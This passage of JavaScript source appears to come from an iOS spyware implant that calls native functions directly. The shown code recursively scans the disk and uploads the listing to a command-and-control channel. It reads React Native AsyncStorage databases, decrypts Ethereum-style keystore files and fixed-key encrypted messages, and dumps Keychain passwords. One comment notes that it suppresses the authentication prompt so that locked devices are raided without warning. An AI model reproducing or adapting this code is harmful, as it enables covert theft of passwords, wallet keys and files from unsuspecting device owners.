totalDirs++;\n\t\t\t\t\t\t\t} else if (fmt === 0xA000) {\n\t\t\t\t\t\t\t\tftype = \"LNK\"; attrs = \"----L-\"; totalLinks++;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tftype = \"FILE\";\n\t\t\t\t\t\t\t\tfsize = _readI64(BigInt(statBuf), 96);\n\t\t\t\t\t\t\t\ttotalSize += fsize;\n\t\t\t\t\t\t\t\ttotalFiles++;\n\t\t\t\t\t\t\t\tvar writable = mode & 0x0080;\n\t\t\t\t\t\t\t\tvar hidden = name.charAt(0) === \".\";\n\t\t\t\t\t\t\t\tattrs = \"-A\" + (writable ? \"-\" : \"R\") + (hidden ? \"H\" : \"-\") + \"--\";\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tatime = _readI64(BigInt(statBuf), 32) * 1000;\n\t\t\t\t\t\t\tmtime = _readI64(BigInt(statBuf), 48) * 1000;\n\t\t\t\t\t\t\tctime = _readI64(BigInt(statBuf), 80) * 1000;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tif (dtype === 4) {\n\t\t\t\t\t\t\t\tftype = \"DIR\"; attrs = \"D-----\"; totalDirs++;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\ttotalFiles++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\temit(_sanitizePath(fullPath) + \"|\" + ftype + \"|\" + attrs + \"|\" + ctime + \"|\" + mtime + \"|\" + atime + \"|\" + fsize);\n\t\t\t\t\t\titemCount++;\n\n\t\t\t\t\t\tif (itemCount % SCAN_YIELD_EVERY === 0) {\n\t\t\t\t\t\t\tNative.callSymbol(\"usleep\", 10000);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tif ((dtype === 4 || (ret === 0 && (_readU16(BigInt(statBuf), 4) & 0xF000) === 0x4000))\n\t\t\t\t\t\t\t&& dtype !== 10) {\n\t\t\t\t\t\t\tstack[stackLen] = fullPath;\n\t\t\t\t\t\t\tstack[stackLen + 1] = depth + 1;\n\t\t\t\t\t\t\tstackLen += 2;\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch(entErr) {}\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"closedir\", BigInt(dh));\n\t\t\t}\n\t\t}\n\n\t\tvar endMs = Date.now();\n\t\tvar endISO = new Date(endMs).toISOString().replace(\"T\",\" \").replace(\"Z\",\"\");\n\t\tvar elapsed = (endMs - startMs) / 1000;\n\t\tvar totalItems = totalFiles + totalDirs;\n\t\tvar speed = elapsed > 0 ? Math.round(totalItems / elapsed) : totalItems;\n\n\t\temit(\"# =====================================\");\n\t\temit(\"# Scan Statistics\");\n\t\temit(\"# =====================================\");\n\t\temit(\"# Total files: \" + totalFiles);\n\t\temit(\"# Total dirs: \" + totalDirs);\n\t\temit(\"# Total symlinks: \" + totalLinks);\n\t\temit(\"# Total items scanned: \" + itemCount);\n\t\temit(\"# Total size (bytes): \" + totalSize);\n\t\temit(\"# Hit item limit: \" + (hitLimit ? \"YES (\" + SCAN_MAX_ITEMS + \")\" : \"NO\"));\n\t\temit(\"# Max depth: \" + SCAN_MAX_DEPTH);\n\t\temit(\"# Write errors: \" + writeErrors);\n\t\temit(\"# Elapsed (seconds): \" + Math.round(elapsed));\n\t\temit(\"# Speed (items/sec): \" + speed);\n\t\temit(\"# End time: \" + endISO);\n\t\temit(\"# End timestamp: \" + endMs);\n\t\temit(\"# =====================================\");\n\n\t} catch(scanErr) {\n\t\temit(\"# SCAN ERROR: \" + String(scanErr));\n\t}\n\n\tflush();\n\tNative.callSymbol(\"fsync\", fd);\n\tNative.callSymbol(\"free\", BigInt(wBuf));\n\tNative.callSymbol(\"free\", BigInt(statBuf));\n\n\tvar fileSize = Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\tNative.callSymbol(\"lseek\", fd, 0, 0);\n\n\tvar upResult = _sendChunksFromFd(cmd.command_id, fd, fileSize, \"scanDisk_root.txt\", \"disk_scan\",\n\t\t{ start_ms: startMs, end_ms: Date.now() });\n\n\tNative.callSymbol(\"close\", fd);\n\tfd = -1;\n\tNative.callSymbol(\"unlink\", tmpPath);\n\n\tif (!upResult || !upResult.ok) {\n\t\ttry {\n\t\t\tsendJSON(cmd.command_id, {\n\t\t\t\tstatus: \"upload_failed\",\n\t\t\t\terror: upResult ? upResult.error : \"null result\",\n\t\t\t\tchunks_sent: upResult ? upResult.sent : 0,\n\t\t\t\tchunks_total: upResult ? upResult.total : 0,\n\t\t\t\tfile_size: fileSize,\n\t\t\t\tscan_items: itemCount,\n\t\t\t\ttmp_path: tmpPath,\n\t\t\t\t_task_id: p._task_id || \"\",\n\t\t\t\t_task_type: p._task_type || \"\"\n\t\t\t}, \"disk_scan_error.json\");\n\t\t} catch(re) {}\n\t}\n}\n\n// ============================================================================\n// Native SQLite Query Helper\n// ============================================================================\n\nvar _sqliteLoaded = false;\nfunction _ensureSqlite() {\n\tif (_sqliteLoaded) return true;\n\tvar h = Native.callSymbol(\"dlopen\", \"/usr/lib/libsqlite3.dylib\", 1);\n\tif (!h || h === 0n) return false;\n\t_sqliteLoaded = true;\n\treturn true;\n}\n\nfunction _sqliteQuery(dbPath, sql, maxRows) {\n\tif (!_ensureSqlite()) return null;\n\tmaxRows = maxRows || 500;\n\tvar ppDb = Native.callSymbol(\"malloc\", 8);\n\tif (!ppDb || ppDb === 0n) return null;\n\tNative.write64(ppDb, 0n);\n\tvar rc = Number(Native.callSymbol(\"sqlite3_open_v2\", dbPath, ppDb, 1, 0n));\n\tvar db = Native.readPtr(ppDb);\n\tNative.callSymbol(\"free\", ppDb);\n\tif (rc !== 0 || !db || db === 0n) {\n\t\tif (db && db !== 0n) Native.callSymbol(\"sqlite3_close\", db);\n\t\treturn null;\n\t}\n\ttry {\n\t\tvar ppStmt = Native.callSymbol(\"malloc\", 8);\n\t\tif (!ppStmt || ppStmt === 0n) return null;\n\t\tNative.write64(ppStmt, 0n);\n\t\trc = Number(Native.callSymbol(\"sqlite3_prepare_v2\", db, sql, -1, ppStmt, 0n));\n\t\tvar stmt = Native.readPtr(ppStmt);\n\t\tNative.callSymbol(\"free\", ppStmt);\n\t\tif (rc !== 0 || !stmt || stmt === 0n) return null;\n\t\ttry {\n\t\t\tvar rows = [];\n\t\t\tvar colCount = Number(Native.callSymbol(\"sqlite3_column_count\", stmt));\n\t\t\tvar colNames = [];\n\t\t\tfor (var c = 0; c < colCount; c++) {\n\t\t\t\tvar np = Native.callSymbol(\"sqlite3_column_name\", stmt, c);\n\t\t\t\tcolNames.push(np && np !== 0n ? Native.readString(np, 256).replace(/\\0/g, \"\") : \"col\" + c);\n\t\t\t}\n\t\t\twhile (rows.length < maxRows) {\n\t\t\t\trc = Number(Native.callSymbol(\"sqlite3_step\", stmt));\n\t\t\t\tif (rc !== 100) break;\n\t\t\t\tvar row = {};\n\t\t\t\tfor (var c = 0; c < colCount; c++) {\n\t\t\t\t\tvar tp = Number(Native.callSymbol(\"sqlite3_column_type\", stmt, c));\n\t\t\t\t\tif (tp === 5) { row[colNames[c]] = null; continue; }\n\t\t\t\t\tif (tp === 1) {\n\t\t\t\t\t\trow[colNames[c]] = Number(Native.callSymbol(\"sqlite3_column_int64\", stmt, c));\n\t\t\t\t\t} else if (tp === 2) {\n\t\t\t\t\t\trow[colNames[c]] = Number(Native.callSymbol(\"sqlite3_column_double\", stmt, c));\n\t\t\t\t\t} else {\n\t\t\t\t\t\tvar txtP = Native.callSymbol(\"sqlite3_column_text\", stmt, c);\n\t\t\t\t\t\tvar txtLen = Number(Native.callSymbol(\"sqlite3_column_bytes\", stmt, c));\n\t\t\t\t\t\tif (txtP && txtP !== 0n && txtLen > 0) {\n\t\t\t\t\t\t\trow[colNames[c]] = Native.readString(txtP, txtLen + 1).substring(0, txtLen);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\trow[colNames[c]] = \"\";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\trows.push(row);\n\t\t\t}\n\t\t\treturn { columns: colNames, rows: rows };\n\t\t} finally { Native.callSymbol(\"sqlite3_finalize\", stmt); }\n\t} finally { Native.callSymbol(\"sqlite3_close\", db); }\n}\n\n// ============================================================================\n// Native CommonCrypto Wrappers\n// ============================================================================\n\nfunction _sha256(data) {\n\tvar inBuf = Native.callSymbol(\"malloc\", BigInt(data.length));\n\tif (!inBuf || inBuf === 0n) return null;\n\tvar outBuf = Native.callSymbol(\"malloc\", 32n);\n\tif (!outBuf || outBuf === 0n) { Native.callSymbol(\"free\", inBuf); return null; }\n\tNative.write(inBuf, data.buffer ? data.buffer : data);\n\tNative.callSymbol(\"CC_SHA256\", inBuf, BigInt(data.length), outBuf);\n\tvar hash = new Uint8Array(Native.read(outBuf, 32));\n\tNative.callSymbol(\"free\", inBuf);\n\tNative.callSymbol(\"free\", outBuf);\n\treturn hash;\n}\n\nfunction _hmacSha256(key, data) {\n\tvar keyBuf = Native.callSymbol(\"malloc\", BigInt(key.length));\n\tvar dataBuf = Native.callSymbol(\"malloc\", BigInt(data.length));\n\tvar outBuf = Native.callSymbol(\"malloc\", 32n);\n\tif (!keyBuf || !dataBuf || !outBuf) {\n\t\tif (keyBuf) Native.callSymbol(\"free\", keyBuf);\n\t\tif (dataBuf) Native.callSymbol(\"free\", dataBuf);\n\t\tif (outBuf) Native.callSymbol(\"free\", outBuf);\n\t\treturn null;\n\t}\n\tNative.write(keyBuf, key.buffer ? key.buffer : key);\n\tNative.write(dataBuf, data.buffer ? data.buffer : data);\n\tNative.callSymbol(\"CCHmac\", 2, keyBuf, BigInt(key.length),\n\t\tdataBuf, BigInt(data.length), outBuf);\n\tvar mac = new Uint8Array(Native.read(outBuf, 32));\n\tNative.callSymbol(\"free\", keyBuf);\n\tNative.callSymbol(\"free\", dataBuf);\n\tNative.callSymbol(\"free\", outBuf);\n\treturn mac;\n}\n\nfunction _pbkdf2(password, salt, iterations, keyLen) {\n\tvar pwBytes = new Uint8Array(password.length);\n\tfor (var i = 0; i < password.length; i++) pwBytes[i] = password.charCodeAt(i);\n\tvar hLen = 32;\n\tvar numBlocks = Math.ceil(keyLen / hLen);\n\tvar dk = new Uint8Array(numBlocks * hLen);\n\tvar keyBuf = Native.callSymbol(\"malloc\", BigInt(pwBytes.length));\n\tvar dataBuf = Native.callSymbol(\"malloc\", BigInt(Math.max(salt.length + 4, hLen)));\n\tvar outBuf = Native.callSymbol(\"malloc\", 32n);\n\tif (!keyBuf || !dataBuf || !outBuf) {\n\t\tif (keyBuf) Native.callSymbol(\"free\", keyBuf);\n\t\tif (dataBuf) Native.callSymbol(\"free\", dataBuf);\n\t\tif (outBuf) Native.callSymbol(\"free\", outBuf);\n\t\treturn null;\n\t}\n\tNative.write(keyBuf, pwBytes.buffer);\n\tfor (var blk = 1; blk <= numBlocks; blk++) {\n\t\tvar intBe = new Uint8Array(4);\n\t\tintBe[0] = (blk >>> 24) & 0xff;\n\t\tintBe[1] = (blk >>> 16) & 0xff;\n\t\tintBe[2] = (blk >>> 8) & 0xff;\n\t\tintBe[3] = blk & 0xff;\n\t\tvar msg = new Uint8Array(salt.length + 4);\n\t\tmsg.set(salt instanceof Uint8Array ? salt : new Uint8Array(salt), 0);\n\t\tmsg.set(intBe, salt.length);\n\t\tNative.write(dataBuf, msg.buffer);\n\t\tNative.callSymbol(\"CCHmac\", 2, keyBuf, BigInt(pwBytes.length),\n\t\t\tdataBuf, BigInt(msg.length), outBuf);\n\t\tvar u = new Uint8Array(Native.read(outBuf, 32));\n\t\tvar t = new Uint8Array(u);\n\t\tfor (var iter = 1; iter < iterations; iter++) {\n\t\t\tNative.write(dataBuf, u.buffer);\n\t\t\tNative.callSymbol(\"CCHmac\", 2, keyBuf, BigInt(pwBytes.length),\n\t\t\t\tdataBuf, 32n, outBuf);\n\t\t\tu = new Uint8Array(Native.read(outBuf, 32));\n\t\t\tfor (var j = 0; j < hLen; j++) t[j] ^= u[j];\n\t\t}\n\t\tdk.set(t, (blk - 1) * hLen);\n\t}\n\tNative.callSymbol(\"free\", keyBuf);\n\tNative.callSymbol(\"free\", dataBuf);\n\tNative.callSymbol(\"free\", outBuf);\n\treturn dk.slice(0, keyLen);\n}\n\nfunction _aesEcbEncryptBlock(cryptorRef, block16) {\n\tvar inBuf = Native.callSymbol(\"malloc\", 16n);\n\tvar outBuf = Native.callSymbol(\"malloc\", 32n);\n\tvar writtenBuf = Native.callSymbol(\"malloc\", 8n);\n\tif (!inBuf || !outBuf || !writtenBuf) {\n\t\tif (inBuf) Native.callSymbol(\"free\", inBuf);\n\t\tif (outBuf) Native.callSymbol(\"free\", outBuf);\n\t\tif (writtenBuf) Native.callSymbol(\"free\", writtenBuf);\n\t\treturn null;\n\t}\n\tNative.write(inBuf, block16.buffer ? block16.buffer : block16);\n\tNative.write64(writtenBuf, 0n);\n\tvar rc = Number(Native.callSymbol(\"CCCryptorUpdate\",\n\t\tcryptorRef, inBuf, 16n, outBuf, 32n, writtenBuf));\n\tvar written = Number(Native.readPtr(writtenBuf));\n\tNative.callSymbol(\"free\", inBuf);\n\tNative.callSymbol(\"free\", writtenBuf);\n\tif (rc !== 0 || written < 16) { Native.callSymbol(\"free\", outBuf); return null; }\n\tvar result = new Uint8Array(Native.read(outBuf, 16));\n\tNative.callSymbol(\"free\", outBuf);\n\treturn result;\n}\n\nfunction _aesCtrDecrypt(keyBytes, ivBytes, cipherBytes) {\n\tvar refBuf = Native.callSymbol(\"malloc\", 8n);\n\tif (!refBuf) return null;\n\tNative.write64(refBuf, 0n);\n\tvar keyBuf = Native.callSymbol(\"malloc\", BigInt(keyBytes.length));\n\tif (!keyBuf) { Native.callSymbol(\"free\", refBuf); return null; }\n\tNative.write(keyBuf, keyBytes.buffer ? keyBytes.buffer : keyBytes);\n\tvar rc = Number(Native.callSymbol(\"CCCryptorCreate\",\n\t\t0, 0, 2, keyBuf, BigInt(keyBytes.length), 0n, refBuf));\n\tNative.callSymbol(\"free\", keyBuf);\n\tif (rc !== 0) { Native.callSymbol(\"free\", refBuf); return null; }\n\tvar ref = Native.readPtr(refBuf);\n\tNative.callSymbol(\"free\", refBuf);\n\tif (!ref || ref === 0n) return null;\n\ttry {\n\t\tvar counter = new Uint8Array(16);\n\t\tfor (var i = 0; i < 16 && i < ivBytes.length; i++) counter[i] = ivBytes[i];\n\t\tvar output = new Uint8Array(cipherBytes.length);\n\t\tfor (var off = 0; off < cipherBytes.length; off += 16) {\n\t\t\tvar ks = _aesEcbEncryptBlock(ref, counter);\n\t\t\tif (!ks) return null;\n\t\t\tvar remain = cipherBytes.length - off;\n\t\t\tvar len = remain < 16 ? remain : 16;\n\t\t\tfor (var j = 0; j < len; j++) output[off + j] = cipherBytes[off + j] ^ ks[j];\n\t\t\tfor (var ci = 15; ci >= 0; ci--) {\n\t\t\t\tcounter[ci] = (counter[ci] + 1) & 0xff;\n\t\t\t\tif (counter[ci] !== 0) break;\n\t\t\t}\n\t\t}\n\t\treturn output;\n\t} finally { Native.callSymbol(\"CCCryptorRelease\", ref); }\n}\n\nfunction _aesCbcDecrypt(keyBytes, ivBytes, cipherBytes) {\n\tvar refBuf = Native.callSymbol(\"malloc\", 8n);\n\tif (!refBuf) return null;\n\tNative.write64(refBuf, 0n);\n\tvar keyBuf = Native.callSymbol(\"malloc\", BigInt(keyBytes.length));\n\tvar ivBuf = Native.callSymbol(\"malloc\", BigInt(ivBytes.length));\n\tif (!keyBuf || !ivBuf) {\n\t\tif (keyBuf) Native.callSymbol(\"free\", keyBuf);\n\t\tif (ivBuf) Native.callSymbol(\"free\", ivBuf);\n\t\tNative.callSymbol(\"free\", refBuf);\n\t\treturn null;\n\t}\n\tNative.write(keyBuf, keyBytes.buffer ? keyBytes.buffer : keyBytes);\n\tNative.write(ivBuf, ivBytes.buffer ? ivBytes.buffer : ivBytes);\n\tvar rc = Number(Native.callSymbol(\"CCCryptorCreate\",\n\t\t1, 0, 0, keyBuf, BigInt(keyBytes.length), ivBuf, refBuf));\n\tNative.callSymbol(\"free\", keyBuf);\n\tNative.callSymbol(\"free\", ivBuf);\n\tif (rc !== 0) { Native.callSymbol(\"free\", refBuf); return null; }\n\tvar ref = Native.readPtr(refBuf);\n\tNative.callSymbol(\"free\", refBuf);\n\tif (!ref || ref === 0n) return null;\n\ttry {\n\t\tvar inBuf = Native.callSymbol(\"malloc\", BigInt(cipherBytes.length));\n\t\tvar outBuf = Native.callSymbol(\"calloc\", 1n, BigInt(cipherBytes.length + 16));\n\t\tvar writtenBuf = Native.callSymbol(\"malloc\", 8n);\n\t\tif (!inBuf || !outBuf || !writtenBuf) {\n\t\t\tif (inBuf) Native.callSymbol(\"free\", inBuf);\n\t\t\tif (outBuf) Native.callSymbol(\"free\", outBuf);\n\t\t\tif (writtenBuf) Native.callSymbol(\"free\", writtenBuf);\n\t\t\treturn null;\n\t\t}\n\t\tNative.write(inBuf, cipherBytes.buffer ? cipherBytes.buffer : cipherBytes);\n\t\tNative.write64(writtenBuf, 0n);\n\t\trc = Number(Native.callSymbol(\"CCCryptorUpdate\",\n\t\t\tref, inBuf, BigInt(cipherBytes.length), outBuf, BigInt(cipherBytes.length + 16), writtenBuf));\n\t\tvar written = Number(Native.readPtr(writtenBuf));\n\t\tNative.callSymbol(\"free\", inBuf);\n\t\tNative.callSymbol(\"free\", writtenBuf);\n\t\tif (rc !== 0) { Native.callSymbol(\"free\", outBuf); return null; }\n\t\tvar result = new Uint8Array(Native.read(outBuf, written));\n\t\tNative.callSymbol(\"free\", outBuf);\n\t\treturn result;\n\t} finally { Native.callSymbol(\"CCCryptorRelease\", ref); }\n}\n\nfunction _hexToBytes(hex) {\n\tvar bytes = new Uint8Array(hex.length / 2);\n\tfor (var i = 0; i < hex.length; i += 2) {\n\t\tbytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);\n\t}\n\treturn bytes;\n}\n\nfunction _bytesToHex(bytes) {\n\tvar hex = \"\";\n\tfor (var i = 0; i < bytes.length; i++) {\n\t\thex += (bytes[i] < 16 ? \"0\" : \"\") + bytes[i].toString(16);\n\t}\n\treturn hex;\n}\n\n// ============================================================================\n// RCTAsyncLocalStorage Reader\n// ============================================================================\n\nfunction _readAsyncStorageManifest(storagePath) {\n\tvar mpath = storagePath + \"/manifest.json\";\n\tvar bytes = _readFileBytes(mpath, 4 * 1024 * 1024);\n\tif (!bytes || bytes.length === 0) return null;\n\ttry {\n\t\tvar json = JSON.parse(_rawToStr(bytes));\n\t\tvar result = {};\n\t\tfor (var key in json) {\n\t\t\tif (!json.hasOwnProperty(key)) continue;\n\t\t\tvar val = json[key];\n\t\t\tif (typeof val === \"string\") {\n\t\t\t\tresult[key] = val;\n\t\t\t} else if (val && typeof val === \"object\") {\n\t\t\t\tvar fpath = storagePath + \"/\" + key;\n\t\t\t\tvar fb = _readFileBytes(fpath, 8 * 1024 * 1024);\n\t\t\t\tif (fb && fb.length > 0) result[key] = _rawToStr(fb);\n\t\t\t}\n\t\t}\n\t\treturn result;\n\t} catch (e) { return null; }\n}\n\nfunction _readAsyncStorageSqlite(storagePath) {\n\tvar dbNames = [\"RCTAsyncLocalStorage_V1\", \"asyncstorage.db\", \"RCTAsyncLocalStorage\"];\n\tvar result = null;\n\tfor (var di = 0; di < dbNames.length; di++) {\n\t\tvar dbPath = storagePath + \"/\" + dbNames[di];\n\t\tif (Number(Native.callSymbol(\"access\", dbPath, 0)) !== 0) {\n\t\t\tdbPath = storagePath.replace(/\\/RCTAsyncLocalStorage_V1$/, \"\") + \"/\" + dbNames[di];\n\t\t\tif (Number(Native.callSymbol(\"access\", dbPath, 0)) !== 0) continue;\n\t\t}\n\t\tvar tables = _sqliteQuery(dbPath, \"SELECT name FROM sqlite_master WHERE type='table'\");\n\t\tif (!tables || !tables.rows.length) continue;\n\t\tvar tableName = null;\n\t\tfor (var ti = 0; ti < tables.rows.length; ti++) {\n\t\t\tvar tn = tables.rows[ti].name;\n\t\t\tif (tn === \"catalystLocalStorage\" || tn === \"key_value\" ||\n\t\t\t\ttn === \"keyvaluestore\" || tn === \"cache\") {\n\t\t\t\ttableName = tn;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (!tableName) tableName = tables.rows[0].name;\n\t\tvar data = _sqliteQuery(dbPath, \"SELECT * FROM \\\"\" + tableName + \"\\\"\");\n\t\tif (!data || !data.rows.length) continue;\n\t\tresult = {};\n\t\tvar kCol = data.columns.indexOf(\"key\") >= 0 ? \"key\" : data.columns[0];\n\t\tvar vCol = data.columns.indexOf(\"value\") >= 0 ? \"value\" : data.columns[1];\n\t\tfor (var ri = 0; ri < data.rows.length; ri++) {\n\t\t\tresult[data.rows[ri][kCol]] = data.rows[ri][vCol];\n\t\t}\n\t\tbreak;\n\t}\n\treturn result;\n}\n\nfunction _readAsyncStorage(containerPath, subPath) {\n\tvar storagePath = containerPath + \"/\" + subPath;\n\tvar st = _statFile(storagePath);\n\tif (!st) return null;\n\tif (st.isDir) {\n\t\tvar res = _readAsyncStorageManifest(storagePath);\n\t\tif (res) return res;\n\t\treturn _readAsyncStorageSqlite(storagePath);\n\t}\n\tif (st.isFile) {\n\t\tvar r = _sqliteQuery(storagePath, \"SELECT name FROM sqlite_master WHERE type='table'\");\n\t\tif (r && r.rows.length) {\n\t\t\tvar result = {};\n\t\t\tfor (var ti = 0; ti < r.rows.length; ti++) {\n\t\t\t\tvar d = _sqliteQuery(storagePath, \"SELECT * FROM \\\"\" + r.rows[ti].name + \"\\\"\");\n\t\t\t\tif (!d || !d.rows.length) continue;\n\t\t\t\tvar kCol = d.columns.indexOf(\"key\") >= 0 ? \"key\" : d.columns[0];\n\t\t\t\tvar vCol = d.columns.indexOf(\"value\") >= 0 ? \"value\" : d.columns[1];\n\t\t\t\tfor (var ri = 0; ri < d.rows.length; ri++) {\n\t\t\t\t\tresult[d.rows[ri][kCol]] = d.rows[ri][vCol];\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn result;\n\t\t}\n\t}\n\treturn null;\n}\n\n// ============================================================================\n// Keystore V3 Decryption (scrypt/PBKDF2 + AES-CTR)\n// ============================================================================\n\nfunction _decryptKeystoreV3(crypto, password) {\n\tif (!crypto || !password) return null;\n\tvar kdfparams = crypto.kdfparams;\n\tvar cipherparams = crypto.cipherparams;\n\tvar ciphertextHex = crypto.ciphertext;\n\tif (!kdfparams || !cipherparams || !ciphertextHex) return null;\n\n\tvar salt = _hexToBytes(kdfparams.salt);\n\tvar dkLen = kdfparams.dklen || 32;\n\tvar derivedKey = null;\n\n\tif (crypto.kdf === \"pbkdf2\") {\n\t\tvar iters = kdfparams.c || 262144;\n\t\tderivedKey = _pbkdf2(password, salt, iters, dkLen);\n\t} else {\n\t\treturn { error: \"scrypt_not_supported_on_device\", kdf: crypto.kdf };\n\t}\n\tif (!derivedKey) return { error: \"kdf_failed\" };\n\n\tvar ciphertext = _hexToBytes(ciphertextHex);\n\tvar iv = _hexToBytes(cipherparams.iv);\n\n\t// MAC verification: SHA256(derivedKey[16:32] + ciphertext) should match crypto.mac\n\tif (crypto.mac) {\n\t\tvar macInput = new Uint8Array(16 + ciphertext.length);\n\t\tmacInput.set(derivedKey.slice(16, 32), 0);\n\t\tmacInput.set(ciphertext, 16);\n\t\tvar computedMac = _sha256(macInput);\n\t\tif (computedMac && _bytesToHex(computedMac) !== crypto.mac) {\n\t\t\treturn { error: \"mac_mismatch\" };\n\t\t}\n\t}\n\n\tvar cipher = (crypto.cipher || \"aes-128-ctr\").toLowerCase();\n\tvar encKey = derivedKey.slice(0, 16);\n\tvar decrypted = null;\n\tif (cipher === \"aes-128-ctr\") {\n\t\tdecrypted = _aesCtrDecrypt(encKey, iv, ciphertext);\n\t} else if (cipher === \"aes-128-cbc\") {\n\t\tdecrypted = _aesCbcDecrypt(encKey, iv, ciphertext);\n\t}\n\tif (!decrypted) return { error: \"decrypt_failed\" };\n\n\ttry {\n\t\tvar str = \"\";\n\t\tfor (var i = 0; i < decrypted.length; i++) {\n\t\t\tif (decrypted[i] === 0) break;\n\t\t\tstr += String.fromCharCode(decrypted[i]);\n\t\t}\n\t\treturn { plaintext: str };\n\t} catch (e) { return { error: \"decode_failed: \" + e }; }\n}\n\n// EncryptedMessage format (fixed key AES-CTR)\nfunction _decryptEncryptedMessage(encObj, fixedKeyHex) {\n\tif (!encObj || !encObj.encStr || !encObj.nonce) return null;\n\tvar key = _hexToBytes(fixedKeyHex);\n\tvar iv = _hexToBytes(encObj.nonce);\n\tvar ciphertext = _hexToBytes(encObj.encStr);\n\tvar plainBytes = _aesCtrDecrypt(key, iv, ciphertext);\n\tif (!plainBytes) return null;\n\tvar str = \"\";\n\tfor (var i = 0; i < plainBytes.length; i++) {\n\t\tif (plainBytes[i] === 0) break;\n\t\tstr += String.fromCharCode(plainBytes[i]);\n\t}\n\treturn str;\n}\n\n// ============================================================================\n// Keychain Password Extraction (SecItemCopyMatching)\n// ============================================================================\n\nvar _securityLoaded = false;\nfunction _ensureSecurity() {\n\tif (_securityLoaded) return true;\n\tvar h = Native.callSymbol(\"dlopen\",\n\t\t\"/System/Library/Frameworks/Security.framework/Security\", 1);\n\tif (!h || h === 0n) return false;\n\t_securityLoaded = true;\n\treturn true;\n}\n\nfunction _cfStr(s) {\n\treturn Native.callSymbol(\"CFStringCreateWithCString\", 0n, s, 0x08000100);\n}\nfunction _cfRelease(ref) {\n\tif (ref && ref !== 0n) Native.callSymbol(\"CFRelease\", ref);\n}\nfunction _cfStringToJS(cfStr) {\n\tif (!cfStr || cfStr === 0n) return null;\n\tvar cstr = Native.callSymbol(\"CFStringGetCStringPtr\", cfStr, 0x08000100);\n\tif (cstr && cstr !== 0n) {\n\t\treturn Native.readString(cstr, 4096).replace(/\\0/g, \"\");\n\t}\n\tvar buf = Native.callSymbol(\"malloc\", 4096);\n\tif (!buf || buf === 0n) return null;\n\tif (Native.callSymbol(\"CFStringGetCString\", cfStr, buf, 4096, 0x08000100)) {\n\t\tvar s = Native.readString(buf, 4096).replace(/\\0/g, \"\");\n\t\tNative.callSymbol(\"free\", buf);\n\t\treturn s;\n\t}\n\tNative.callSymbol(\"free\", buf);\n\treturn null;\n}\nfunction _cfDataToBytes(cfData) {\n\tif (!cfData || cfData === 0n) return null;\n\tvar len = Number(Native.callSymbol(\"CFDataGetLength\", cfData));\n\tif (len <= 0) return null;\n\tvar ptr = Native.callSymbol(\"CFDataGetBytePtr\", cfData);\n\tif (!ptr || ptr === 0n) return null;\n\treturn new Uint8Array(Native.read(ptr, len));\n}\n\nfunction _searchKeychain(service, account, accessGroup) {\n\tif (!_ensureSecurity()) return null;\n\tNative.callSymbol(\"dlopen\",\n\t\t\"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\n\tvar kSecClass = Native.callSymbol(\"dlsym\", -2n, \"kSecClass\");\n\tvar kSecClassGenericPassword = Native.callSymbol(\"dlsym\", -2n, \"kSecClassGenericPassword\");\n\tvar kSecAttrService = Native.callSymbol(\"dlsym\", -2n, \"kSecAttrService\");\n\tvar kSecAttrAccount = Native.callSymbol(\"dlsym\", -2n, \"kSecAttrAccount\");\n\tvar kSecReturnData = Native.callSymbol(\"dlsym\", -2n, \"kSecReturnData\");\n\tvar kSecReturnAttributes = Native.callSymbol(\"dlsym\", -2n, \"kSecReturnAttributes\");\n\tvar kSecMatchLimit = Native.callSymbol(\"dlsym\", -2n, \"kSecMatchLimit\");\n\tvar kSecMatchLimitAll = Native.callSymbol(\"dlsym\", -2n, \"kSecMatchLimitAll\");\n\tvar kCFBooleanTrue = Native.callSymbol(\"dlsym\", -2n, \"kCFBooleanTrue\");\n\n\tif (!kSecClass || kSecClass === 0n) return null;\n\n\tvar svcCF = 0n, acctCF = 0n;\n\tvar _authUIKeyCF = 0n, _authUIValCF = 0n;\n\ttry {\n\t\tvar keys = [];\n\t\tvar vals = [];\n\n\t\tkeys.push(Native.readPtr(kSecClass));\n\t\tvals.push(Native.readPtr(kSecClassGenericPassword));\n\t\tkeys.push(Native.readPtr(kSecReturnData));\n\t\tvals.push(Native.readPtr(kCFBooleanTrue));\n\t\tkeys.push(Native.readPtr(kSecReturnAttributes));\n\t\tvals.push(Native.readPtr(kCFBooleanTrue));\n\t\tkeys.push(Native.readPtr(kSecMatchLimit));\n\t\tvals.push(Native.readPtr(kSecMatchLimitAll));\n\n\t\t// fix #3: skip auth UI so locked devices don't prompt \"Enter password for\n\t\t// SpringBoard\". Mirrors _secDumpClass. Auth-protected items are silently\n\t\t// skipped (errSecInteractionNotAllowed) instead of triggering a dialog.\n\t\t_authUIKeyCF = _cfStr(\"u_AuthUI\");\n\t\t_authUIValCF = _cfStr(\"u_AuthUISkip\");\n\t\tif (_authUIKeyCF && _authUIKeyCF !== 0n && _authUIValCF && _authUIValCF !== 0n) {\n\t\t\tkeys.push(_authUIKeyCF);\n\t\t\tvals.push(_authUIValCF);\n\t\t}\n\n\t\tif (service) {\n\t\t\tkeys.push(Native.readPtr(kSecAttrService));\n\t\t\tsvcCF = _cfStr(service);\n\t\t\tvals.push(svcCF);\n\t\t}\n\t\tif (account) {\n\t\t\tkeys.push(Native.readPtr(kSecAttrAccount));\n\t\t\tacctCF = _cfStr(account);\n\t\t\tvals.push(acctCF);\n\t\t}\n\n\t\tvar nItems = keys.length;\n\t\tvar keysBuf = Native.callSymbol(\"malloc\", BigInt(nItems * 8));\n\t\tvar valsBuf = Native.callSymbol(\"malloc\", BigInt(nItems * 8));\n\t\tif (!keysBuf || keysBuf === 0n || !valsBuf || valsBuf === 0n) {\n\t\t\tif (keysBuf && keysBuf !== 0n) 